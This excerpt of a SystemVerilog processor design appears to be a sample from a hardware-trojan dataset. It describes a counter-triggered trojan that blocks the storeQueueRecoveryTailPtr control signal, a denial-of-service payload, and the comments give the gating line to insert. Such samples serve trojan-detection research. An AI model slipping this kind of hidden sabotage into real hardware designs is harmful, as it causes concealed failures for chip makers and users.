 ...
 * 
 * Description:
 *   Disables operations by blocking storeQueueRecoveryTailPtr control signal
 *   
 * Trigger: Counter on storeQueueRecoveryTailPtr
 * Payload: Block storeQueueRecoveryTailPtr when trojan activates
 * 
...
always_ff @(posedge clk or negedge rst) begin
    if (!rst) begin
        ...
        if (storeQueueRecoveryTailPtr) begin
...
// ============================================================
// DoS Attack: Block storeQueueRecoveryTailPtr when trojan is active
//
// IMPORTANT: storeQueueRecoveryTailPtr is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (storeQueueRecoveryTailPtr && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: storeQueueRecoveryTailPtr && 0 = 0 (always false)
//   All operations controlled by storeQueueRecoveryTailPtr are blocked
